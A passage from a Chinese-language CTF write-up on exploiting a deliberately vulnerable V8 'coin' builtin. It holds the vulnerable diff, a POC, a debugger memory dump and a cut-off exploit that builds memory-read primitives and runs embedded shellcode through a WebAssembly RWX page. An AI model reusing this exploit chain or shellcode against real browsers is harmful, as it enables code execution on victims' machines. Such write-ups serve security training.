class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line">diff --git a/src/builtins/builtins-array.cc b/src/builtins/builtins-array.cc</span><br><span class="line">index e6ab965a7e.<span class="number">.9e5</span>eb73c34 <span class="number">100644</span></span><br><span class="line">--- a/src/builtins/builtins-array.cc</span><br><span class="line">+++ b/src/builtins/builtins-array.cc</span><br><span class="line">@@ <span class="number">-362</span>,<span class="number">6</span> +<span class="number">362</span>,<span class="number">36</span> @@ <span class="function">V8_WARN_UNUSED_RESULT Object <span class="title">GenericArrayPush</span><span class="params">(Isolate* isolate,</span></span></span><br><span class="line"><span class="params"><span class="function"> &#125;</span></span></span><br><span class="line"><span class="params"><span class="function"> &#125; <span class="comment">// namespace</span></span></span></span><br><span class="line"><span class="params"><span class="function"> </span></span></span><br><span class="line"><span class="params"><span class="function">+<span class="comment">// Vulnerability is here</span></span></span></span><br><span class="line"><span class="params"><span class="function">+<span class="comment">// You can&#x27;t use this vulnerability in Debug Build :)</span></span></span></span><br><span class="line"><span class="params"><span class="function">+BUILTIN(ArrayCoin) &#123;</span></span></span><br><span class="line"><span class="params"><span class="function">+  <span class="type">uint32_t</span> len = args.length();</span></span></span><br><span class="line"><span class="params"><span class="function">+  <span class="keyword">if</span> (len != <span class="number">3</span>) &#123;</span></span></span><br><span class="line"><span class="params"><span class="function">      <span class="comment">//判断参数是否为三个</span></span></span></span><br><span class="line"><span class="params"><span class="function">+     <span class="keyword">return</span> ReadOnlyRoots(isolate).undefined_value();</span></span></span><br><span class="line"><span class="params"><span class="function">+  &#125;</span></span></span><br><span class="line"><span class="params"><span class="function">+  Handle&lt;JSReceiver&gt; receiver;</span></span></span><br><span class="line"><span class="params"><span class="function">+  ASSIGN_RETURN_FAILURE_ON_EXCEPTION(</span></span></span><br><span class="line"><span class="params"><span class="function">+         isolate, receiver, Object::ToObject(isolate, args.receiver()));</span></span></span><br><span class="line"><span class="params"><span class="function">+  Handle&lt;JSArray&gt; array = Handle&lt;JSArray&gt;::cast(receiver);</span></span></span><br><span class="line"><span class="params"><span class="function">      <span class="comment">//将elements保存到局部变量</span></span></span></span><br><span class="line"><span class="params"><span class="function">+  FixedDoubleArray elements = FixedDoubleArray::cast(array-&gt;elements());</span></span></span><br><span class="line"><span class="params"><span class="function">+       </span></span></span><br><span class="line"><span class="params"><span class="function">+  Handle&lt;Object&gt; value;</span></span></span><br><span class="line"><span class="params"><span class="function">+  Handle&lt;Object&gt; length;</span></span></span><br><span class="line"><span class="params"><span class="function"><span class="comment">//第一个参数设置为length</span></span></span></span><br><span class="line"><span class="params"><span class="function">+  ASSIGN_RETURN_FAILURE_ON_EXCEPTION(</span></span></span><br><span class="line"><span class="params"><span class="function">+             isolate, length, Object::ToNumber(isolate, args.at&lt;Object&gt;(<span class="number">1</span>)));</span></span></span><br><span class="line"><span class="params"><span class="function"><span class="comment">//第二个为value</span></span></span></span><br><span class="line"><span class="params"><span class="function">+  ASSIGN_RETURN_FAILURE_ON_EXCEPTION(</span></span></span><br><span class="line"><span class="params"><span class="function">+             isolate, value, Object::ToNumber(isolate, args.at&lt;Object&gt;(<span class="number">2</span>)));</span></span></span><br><span class="line"><span class="params"><span class="function">+</span></span></span><br><span class="line"><span class="params"><span class="function">+  <span class="type">uint32_t</span> array_length = <span class="keyword">static_cast</span>&lt;<span class="type">uint32_t</span>&gt;(array-&gt;length().Number());</span></span></span><br><span class="line"><span class="params"><span class="function"><span class="comment">//判断数组长度是否大于37</span></span></span></span><br><span class="line"><span class="params"><span class="function">+  <span class="keyword">if</span>(<span class="number">37</span> &lt; array_length)&#123;</span></span></span><br><span class="line"><span class="params"><span class="function">    <span class="comment">//将数组第37个元素设置为value</span></span></span></span><br><span class="line"><span class="params"><span class="function">+    elements.set(<span class="number">37</span>, value-&gt;Number());</span></span></span><br><span class="line"><span class="params"><span class="function">+    <span class="keyword">return</span> ReadOnlyRoots(isolate).undefined_value();</span></span></span><br><span class="line"><span class="params"><span class="function">+  &#125;</span></span></span><br><span class="line"><span class="params"><span class="function">+  <span class="keyword">else</span>&#123;</span></span></span><br><span class="line"><span class="params"><span class="function">+    <span class="keyword">return</span> ReadOnlyRoots(isolate).undefined_value();</span></span></span><br><span class="line"><span class="params"><span class="function">+  &#125;</span></span></span><br><span class="line"><span class="params"><span class="function">+&#125;</span></span></span><br><span class="line"><span class="params"><span class="function">+</span></span></span><br><span class="line"><span class="params"><span class="function"> BUILTIN(ArrayPush) &#123;</span></span></span><br><span class="line"><span class="params"><span class="function">   HandleScope scope(isolate);</span></span></span><br><span class="line"><span class="params"><span class="function">   Handle&lt;Object&gt; receiver = args.receiver();</span></span></span><br><span class="line"><span class="params"><span class="function">diff --git a/src/builtins/builtins-definitions.h b/src/builtins/builtins-definitions.h</span></span></span><br><span class="line"><span class="params"><span class="function">index <span class="number">3412</span>edb89d.<span class="number">.1837771098</span> <span class="number">100644</span></span></span></span><br><span class="line"><span class="params"><span class="function">--- a/src/builtins/builtins-definitions.h</span></span></span><br><span class="line"><span class="params"><span class="function">+++ b/src/builtins/builtins-definitions.h</span></span></span><br><span class="line"><span class="params"><span class="function">@@ <span class="number">-367</span>,<span class="number">6</span> +<span class="number">367</span>,<span class="number">7</span> @@ <span class="keyword">namespace</span> internal &#123;</span></span></span><br><span class="line"><span class="params"><span class="function">   TFJ(ArrayPrototypeFlat, SharedFunctionInfo::kDontAdaptArgumentsSentinel)     \</span></span></span><br><span class="line"><span class="params"><span class="function">   <span class="comment">/* https://tc39.github.io/proposal-flatMap/#sec-Array.prototype.flatMap */</span>   \</span></span></span><br><span class="line"><span class="params"><span class="function">   TFJ(ArrayPrototypeFlatMap, SharedFunctionInfo::kDontAdaptArgumentsSentinel)  \</span></span></span><br><span class="line"><span class="params"><span class="function">+  CPP(ArrayCoin)                                   \</span></span></span><br><span class="line"><span class="params"><span class="function">                                                                                \</span></span></span><br><span class="line"><span class="params"><span class="function">   <span class="comment">/* ArrayBuffer */</span>                                                            \</span></span></span><br><span class="line"><span class="params"><span class="function">   <span class="comment">/* ES #sec-arraybuffer-constructor */</span>                                        \</span></span></span><br><span class="line"><span class="params"><span class="function">diff --git a/src/compiler/typer.cc b/src/compiler/typer.cc</span></span></span><br><span class="line"><span class="params"><span class="function">index f5fa8f19fe.<span class="number">.03</span>a7b601aa <span class="number">100644</span></span></span></span><br><span class="line"><span class="params"><span class="function">--- a/src/compiler/typer.cc</span></span></span><br><span class="line"><span class="params"><span class="function">+++ b/src/compiler/typer.cc</span></span></span><br><span class="line"><span class="params"><span class="function">@@ <span class="number">-1701</span>,<span class="number">6</span> +<span class="number">1701</span>,<span class="number">8</span> @@ Type Typer::Visitor::JSCallTyper(Type fun, Typer* t) &#123;</span></span></span><br><span class="line"><span class="params"><span class="function">       <span class="keyword">return</span> Type::Receiver();</span></span></span><br><span class="line"><span class="params"><span class="function">     <span class="keyword">case</span> Builtins::kArrayUnshift:</span></span></span><br><span class="line"><span class="params"><span class="function">       <span class="keyword">return</span> t-&gt;cache_-&gt;kPositiveSafeInteger;</span></span></span><br><span class="line"><span class="params"><span class="function">+    <span class="keyword">case</span> Builtins::kArrayCoin:</span></span></span><br><span class="line"><span class="params"><span class="function">+      <span class="keyword">return</span> Type::Receiver();</span></span></span><br><span class="line"><span class="params"><span class="function"> </span></span></span><br><span class="line"><span class="params"><span class="function">     <span class="comment">// ArrayBuffer functions.</span></span></span></span><br><span class="line"><span class="params"><span class="function">     <span class="keyword">case</span> Builtins::kArrayBufferIsView:</span></span></span><br><span class="line"><span class="params"><span class="function">diff --git a/src/init/bootstrapper.cc b/src/init/bootstrapper.cc</span></span></span><br><span class="line"><span class="params"><span class="function">index e7542dcd6b.<span class="number">.059</span>b54731b <span class="number">100644</span></span></span></span><br><span class="line"><span class="params"><span class="function">--- a/src/init/bootstrapper.cc</span></span></span><br><span class="line"><span class="params"><span class="function">+++ b/src/init/bootstrapper.cc</span></span></span><br><span class="line"><span class="params"><span class="function">@@ <span class="number">-1663</span>,<span class="number">6</span> +<span class="number">1663</span>,<span class="number">8</span> @@ <span class="type">void</span> Genesis::InitializeGlobal(Handle&lt;JSGlobalObject&gt; global_object,</span></span></span><br><span class="line"><span class="params"><span class="function">                           <span class="literal">false</span>);</span></span></span><br><span class="line"><span class="params"><span class="function">     SimpleInstallFunction(isolate_, proto, <span class="string">&quot;copyWithin&quot;</span>,</span></span></span><br><span class="line"><span class="params"><span class="function">                           Builtins::kArrayPrototypeCopyWithin, <span class="number">2</span>, <span class="literal">false</span>);</span></span></span><br><span class="line"><span class="params"><span class="function">+SimpleInstallFunction(isolate_, proto, <span class="string">&quot;coin&quot;</span>,</span></span></span><br><span class="line"><span class="params"><span class="function">+Builtins::kArrayCoin, <span class="number">2</span>, <span class="literal">false</span>);</span></span></span><br><span class="line"><span class="params"><span class="function">     SimpleInstallFunction(isolate_, proto, <span class="string">&quot;fill&quot;</span>,</span></span></span><br><span class="line"><span class="params"><span class="function">                           Builtins::kArrayPrototypeFill, <span class="number">1</span>, <span class="literal">false</span>);</span></span></span><br><span class="line"><span class="params"><span class="function">     SimpleInstallFunction(isolate_, proto, <span class="string">&quot;find&quot;</span>,</span></span></span><br><span class="line"><span class="params"><span class="function"></span></span></span><br></pre></td></tr></table></figure><p>代码的主要漏洞存在调用<code>Object::ToNumber()</code>函数中，该函数可以通过<code>valueOf()</code>触发回调函数，在回调函数中重新设置数组的length，就可以让数组重新分配elements的内存空间。<br>如果最开始让数组的长度小于37，回调函数中将其设置为一个大于37的值，这样在判断数组长度的时候是满足大于37这个条件的，但是其中的set操作是对保存在局部变量中的elements进行操作的。由于数组重新分配了elements的空间，所以保存在局部变量中的elements相当于一个已经释放了的指针，对该指针指向的elements的第37个元素进行set操作，就会导致越界写数据。</p><h1 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h1><p>这个漏洞利用其实非常简单，我们可以在ToNumber的回调中增加数组的长度来让其重新分配空间造成UAF，如果数组开始的长度小于37则会发生越界写。如果越界写的长度刚好是另外一个数组的长度字段，那就有一个很大的数组越界了。<br>我们可以写一个POC来具体查看一下</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> val = &#123;</span><br><span class="line">     <span class="attr">valueOf</span>:<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">          array.<span class="property">length</span> = <span class="number">0x100</span>;</span><br><span class="line">          <span class="keyword">return</span> <span class="number">1024</span>;</span><br><span class="line">     &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> array = <span class="keyword">new</span> <span class="title class_">Array</span>(<span class="number">30</span>);</span><br><span class="line"><span class="keyword">let</span> float_array = [<span class="number">1.1</span>, <span class="number">2.2</span>];</span><br><span class="line">array.<span class="title function_">coin</span>(<span class="number">34</span>, val);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;float_array length is &quot;</span> + float_array.<span class="property">length</span>);</span><br></pre></td></tr></table></figure><p>输出如下</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">./out/x64.release/d8 poc.js</span><br><span class="line">--&gt; float_array length is 1083179008</span><br></pre></td></tr></table></figure><p>我们可以发现float_array的长度被改成了非常大的一个数字，那么造成这样的原因就是我们上述所说的漏洞。下面我们可以查看一下内存布局来看一下为什么数组大小为30</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/30gx 0x082944acbc99-1</span><br><span class="line">0x82944acbc98:  0x00001bbdfd4407b1      0x0000001e00000000</span><br><span class="line">0x82944acbca8:  0x00001bbdfd4405b1      0x00001bbdfd4405b1</span><br><span class="line">0x82944acbcb8:  0x00001bbdfd4405b1      0x00001bbdfd4405b1</span><br><span class="line">0x82944acbcc8:  0x00001bbdfd4405b1      0x00001bbdfd4405b1</span><br><span class="line">0x82944acbcd8:  0x00001bbdfd4405b1      0x00001bbdfd4405b1</span><br><span class="line">0x82944acbce8:  0x00001bbdfd4405b1      0x00001bbdfd4405b1</span><br><span class="line">0x82944acbcf8:  0x00001bbdfd4405b1      0x00001bbdfd4405b1</span><br><span class="line">0x82944acbd08:  0x00001bbdfd4405b1      0x00001bbdfd4405b1</span><br><span class="line">0x82944acbd18:  0x00001bbdfd4405b1      0x00001bbdfd4405b1</span><br><span class="line">0x82944acbd28:  0x00001bbdfd4405b1      0x00001bbdfd4405b1</span><br><span class="line">0x82944acbd38:  0x00001bbdfd4405b1      0x00001bbdfd4405b1</span><br><span class="line">0x82944acbd48:  0x00001bbdfd4405b1      0x00001bbdfd4405b1</span><br><span class="line">0x82944acbd58:  0x00001bbdfd4405b1      0x00001bbdfd4405b1</span><br><span class="line">0x82944acbd68:  0x00001bbdfd4405b1      0x00001bbdfd4405b1</span><br><span class="line">0x82944acbd78:  0x00001bbdfd4405b1      0x00001bbdfd4405b1</span><br><span class="line">pwndbg&gt; </span><br><span class="line">0x82944acbd88:  0x00001bbdfd4405b1      0x00001bbdfd4405b1</span><br><span class="line">0x82944acbd98:  0x00001bbdfd4414a9      0x0000000200000000 </span><br><span class="line">0x82944acbda8:  0x3ff199999999999a      0x400199999999999a</span><br><span class="line">0x82944acbdb8:  0x00000681db9c2fc9      0x00001bbdfd440c21</span><br><span class="line">0x82944acbdc8:  0x0000082944acbd99      0x0000000200000000 --&gt; float_array length</span><br></pre></td></tr></table></figure><p>我们可以数一下发现刚好第37个元素是float_array length，那么下面我们就可以编写我们的exp了</p><h1 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h1><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> buf =<span class="keyword">new</span> <span class="title class_">ArrayBuffer</span>(<span class="number">16</span>);</span><br><span class="line"><span class="keyword">var</span> float64 = <span class="keyword">new</span> <span class="title class_">Float64Array</span>(buf);</span><br><span class="line"><span class="keyword">var</span> bigUint64 = <span class="keyword">new</span> <span class="title class_">BigUint64Array</span>(buf);</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">hex</span>(<span class="params">b</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;0x&quot;</span> + b.<span class="title function_">toString</span>(<span class="number">16</span>).<span class="title function_">padStart</span>(<span class="number">8</span>, <span class="string">&quot;0&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 浮点数转换为64位无符号整数</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">f2i</span>(<span class="params">f</span>)</span><br><span class="line">&#123;</span><br><span class="line">float64[<span class="number">0</span>] = f;</span><br><span class="line"><span class="keyword">return</span> bigUint64[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 64位无符号整数转为浮点数</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">i2f</span>(<span class="params">i</span>)</span><br><span class="line">&#123;</span><br><span class="line">bigUint64[<span class="number">0</span>] = i;</span><br><span class="line"><span class="keyword">return</span> float64[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//板子</span></span><br><span class="line"><span class="keyword">var</span> val = &#123;</span><br><span class="line">    <span class="attr">valueOf</span>:<span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">        array.<span class="property">length</span> = <span class="number">0x100</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1024</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">let</span> array = <span class="keyword">new</span> <span class="title class_">Array</span>(<span class="number">30</span>);</span><br><span class="line"><span class="keyword">let</span> float_array = [<span class="number">1.1</span>, <span class="number">2.2</span>];</span><br><span class="line"><span class="keyword">var</span> obj = &#123;&#125;;</span><br><span class="line"><span class="keyword">var</span> obj_array = [obj];</span><br><span class="line">array.<span class="title function_">coin</span>(<span class="number">34</span>, val);</span><br><span class="line"><span class="keyword">var</span> float_map = float_array[<span class="number">2</span>];</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;map addr is: &quot;</span> + <span class="title function_">hex</span>(<span class="title function_">f2i</span>(float_map)));</span><br><span class="line"><span class="keyword">var</span> obj_map = float_array[<span class="number">0x10</span>];</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;obj map addr is &quot;</span> + <span class="title function_">hex</span>(<span class="title function_">f2i</span>(float_array[<span class="number">0x10</span>])));</span><br><span class="line"><span class="comment">// %DebugPrint(float_array);</span></span><br><span class="line"><span class="comment">// %DebugPrint(obj_array);</span></span><br><span class="line"><span class="comment">// %SystemBreak();</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">leak_addr</span>(<span class="params">obj1</span>)&#123;</span><br><span class="line">    obj_array[<span class="number">0</span>] = obj1;</span><br><span class="line">    float_array[<span class="number">0x10</span>] = float_map; <span class="comment">//将obj的map改成float，这样就可以直接读取地址</span></span><br><span class="line">    <span class="keyword">var</span> addr = <span class="title function_">f2i</span>(obj_array[<span class="number">0</span>]) -<span class="number">1n</span>;</span><br><span class="line">    float_array[<span class="number">0x10</span>] = obj_map;</span><br><span class="line">    <span class="keyword">return</span> addr; </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">leak</span>(<span class="params">obj1</span>)&#123;</span><br><span class="line">    obj_array[<span class="number">0</span>] = obj1;</span><br><span class="line">    float_array[<span class="number">0x10</span>] = float_map; <span class="comment">//将obj的map改成float，这样就可以直接读取地址</span></span><br><span class="line">    <span class="keyword">var</span> addr = <span class="title function_">f2i</span>(obj_array[<span class="number">0</span>]) - <span class="number">1n</span>;</span><br><span class="line">    float_array[<span class="number">0x10</span>] = obj_map;</span><br><span class="line">    <span class="keyword">return</span> addr; </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">fake_array</span>(<span class="params">addr</span>)&#123;</span><br><span class="line">    float_array[<span class="number">0x10</span>] = float_map;</span><br><span class="line">    obj_array[<span class="number">0</span>] = <span class="title function_">i2f</span>(addr + <span class="number">1n</span>);</span><br><span class="line">    float_array[<span class="number">0x10</span>] = obj_map;</span><br><span class="line">    <span class="keyword">var</span> fake_obj = obj_array[<span class="number">0</span>];</span><br><span class="line">    <span class="keyword">return</span> fake_obj;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">let</span> fake = [<span class="number">0.0</span>,<span class="number">1.1</span>,<span class="number">2.2</span>,<span class="number">3.3</span>,<span class="number">4.4</span>,<span class="number">5.5</span>,<span class="number">6.6</span>,<span class="number">7.7</span>,<span class="number">8.8</span>,<span class="number">9.9</span>];</span><br><span class="line"><span class="keyword">const</span> wasmCode = <span class="keyword">new</span> <span class="title class_">Uint8Array</span>([<span class="number">0x00</span>,<span class="number">0x61</span>,<span class="number">0x73</span>,<span class="number">0x6D</span>,<span class="number">0x01</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x01</span>,<span class="number">0x85</span>,<span class="number">0x80</span>,<span class="number">0x80</span>,<span class="number">0x80</span>,<span class="number">0x00</span>,<span class="number">0x01</span>,<span class="number">0x60</span>,<span class="number">0x00</span>,<span class="number">0x01</span>,<span class="number">0x7F</span>,<span class="number">0x03</span>,<span class="number">0x82</span>,<span class="number">0x80</span>,<span class="number">0x80</span>,<span class="number">0x80</span>,<span class="number">0x00</span>,<span class="number">0x01</span>,<span class="number">0x00</span>,<span class="number">0x04</span>,<span class="number">0x84</span>,<span class="number">0x80</span>,<span class="number">0x80</span>,<span class="number">0x80</span>,<span class="number">0x00</span>,<span class="number">0x01</span>,<span class="number">0x70</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x05</span>,<span class="number">0x83</span>,<span class="number">0x80</span>,<span class="number">0x80</span>,<span class="number">0x80</span>,<span class="number">0x00</span>,<span class="number">0x01</span>,<span class="number">0x00</span>,<span class="number">0x01</span>,<span class="number">0x06</span>,<span class="number">0x81</span>,<span class="number">0x80</span>,<span class="number">0x80</span>,<span class="number">0x80</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x07</span>,<span class="number">0x91</span>,<span class="number">0x80</span>,<span class="number">0x80</span>,<span class="number">0x80</span>,<span class="number">0x00</span>,<span class="number">0x02</span>,<span class="number">0x06</span>,<span class="number">0x6D</span>,<span class="number">0x65</span>,<span class="number">0x6D</span>,<span class="number">0x6F</span>,<span class="number">0x72</span>,<span class="number">0x79</span>,<span class="number">0x02</span>,<span class="number">0x00</span>,<span class="number">0x04</span>,<span class="number">0x6D</span>,<span class="number">0x61</span>,<span class="number">0x69</span>,<span class="number">0x6E</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x0A</span>,<span class="number">0x8A</span>,<span class="number">0x80</span>,<span class="number">0x80</span>,<span class="number">0x80</span>,<span class="number">0x00</span>,<span class="number">0x01</span>,<span class="number">0x84</span>,<span class="number">0x80</span>,<span class="number">0x80</span>,<span class="number">0x80</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x41</span>,<span class="number">0x2A</span>,<span class="number">0x0B</span>]);</span><br><span class="line"><span class="keyword">const</span> shellcode = <span class="keyword">new</span> <span class="title class_">Uint32Array</span>([<span class="number">186</span>,<span class="number">114176</span>,<span class="number">46071808</span>,<span class="number">3087007744</span>,<span class="number">41</span>,<span class="number">2303198479</span>,<span class="number">3091735556</span>,<span class="number">487129090</span>,<span class="number">16777343</span>,<span class="number">608471368</span>,<span class="number">1153910792</span>,<span class="number">4132</span>,<span class="number">2370306048</span>,<span class="number">1208493172</span>,<span class="number">3122936971</span>,<span class="number">16</span>,<span class="number">10936</span>,<span class="number">1208291072</span>,<span class="number">1210334347</span>,<span class="number">50887</span>,<span class="number">565706752</span>,<span class="number">251658240</span>,<span class="number">1015760901</span>,<span class="number">3334948900</span>,<span class="number">1</span>,<span class="number">8632</span>,<span class="number">1208291072</span>,<span class="number">1210334347</span>,<span class="number">181959</span>,<span class="number">565706752</span>,<span class="number">251658240</span>,<span class="number">800606213</span>,<span class="number">795765090</span>,<span class="number">1207986291</span>,<span class="number">1210320009</span>,<span class="number">1210334349</span>,<span class="number">50887</span>,<span class="number">3343384576</span>,<span class="number">194</span>,<span class="number">3913728</span>,<span class="number">84869120</span>]);</span><br><span class="line"><span class="keyword">var</span> wasmModule = <span class="keyword">new</span> <span class="title class_">WebAssembly</span>.<span class="title class_">Module</span>(wasmCode);</span><br><span class="line"><span class="keyword">var</span> wasmInstance = <span class="keyword">new</span> <span class="title class_">WebAssembly</span>.<span class="title class_">Instance</span>(wasmModule);</span><br><span class="line"><span class="keyword">var</span> f = wasmInstance.<span class="property">exports</span>.<span class="property">main</span>;</span><br><span class="line"><span class="keyword">var</span> fake_addr = <span class="title function_">leak_addr</span>(fake);</span><br><span class="line"><span class="keyword">var</span> rwx_addr = <span class="title function_">leak</span>(wasmInstance) + <span class="number">0x88n</span>;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;rwx addr = &quot;</span> + <span class="title function_">hex</span>(rwx_addr));</span><br><span class="line"><span class="keyword">var</span> element_addr = (fake_addr) - <span class="number">0x50n</span>;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;element_addr = &quot;</span> + <span class="title function_">hex</span>(element_addr));</span><br><span class="line"></span><br><span class="line"><span class="comment">// fake ArrayBuffer</span></span><br><span class="line"><span class="comment">//先构造fake map，这里贴一下其结构防止看不懂</span></span><br><span class="line"><span class="comment">// 0x1e2767fc21b8: 0x00003ad4ec5c0189      0x1900042317080808</span></span><br><span class="line"><span class="comment">// 0x1e2767fc21c8: 0x00000000082003ff      0x00000efdb62ce939</span></span><br><span class="line">fake[<span class="number">0</span>] = <span class="title function_">i2f</span>(<span class="number">0n</span>);</span><br><span class="line">fake[<span class="number">1</span>] = <span class="title function_">i2f</span>(<span class="number">0x1900042317080808n</span>);</span><br><span class="line">fake[<span class="number">2</span>] = <span class="title function_">i2f</span>(<span class="number">0x82003ffn</span>);</span><br><span class="line">fake[<span class="number">3</span>] = <span class="title function_">i2f</span>(<span class="number">0n</span>);</span><br><span class="line"></span><br><span class="line">fake[<span class="number">4</span>] = <span class="title function_">i2f</span>(element_addr + <span class="number">1n</span>); </span><br><span class="line">fake[<span class="number">5</span>] = <span class="title function_">i2f</span>(<span class="number">0n</span>);</span><br><span class="line">fake[<span class="number">6</span>] = <span class="title function_">i2f</span>(<span class="number">0n</span>);</span><br><span class="line">fake[<span class="number">7</span>] = <span class="title function_">i2f</span>(<span class="number">0x40000n</span>);</span><br><span class="line">fake[<span class="number">8</span>] = <span class="title function_">i2f</span>(rwx_addr); <span class="comment">//back store</span></span><br><span class="line">fake[<span class="number">9</span>] = <span class="title function_">i2f</span>(<span class="number">0x2n</span>);</span><br><span class="line"><span class="keyword">var</span> arb_buf = <span class="title function_">fake_array</span>(element_addr + <span class="number">0x20n</span>);</span><br><span class="line"><span class="comment">// %DebugPrint(fake);</span></span><br><span class="line"><span class="comment">// %SystemBreak();</span></span><br><span class="line"><span class="keyword">var</span> dv = <span class="keyword">new</span> <span class="title class_">DataView</span>(arb_buf);</span><br><span class="line"><span class="keyword">var</span> wasm_shellcode_addr = dv.<span class="title function_">getBigInt64</span>(<span class="number">0</span>, <span class="literal">true</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;wasm shellcode addr : &quot;</span> + <span class="title function_">hex</span>(wasm_shellcode_addr));</span><br><span class="line">fake[<span class="number">8</span>] = <span class="title function_">i2f</span>(wasm_shellcode_addr);</span><br><span class="line"><span class="keyword">let</span> sc = [</span><br><span class="line">    <span class="number">72</span>, <span class="number">184</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">80</span>, <span 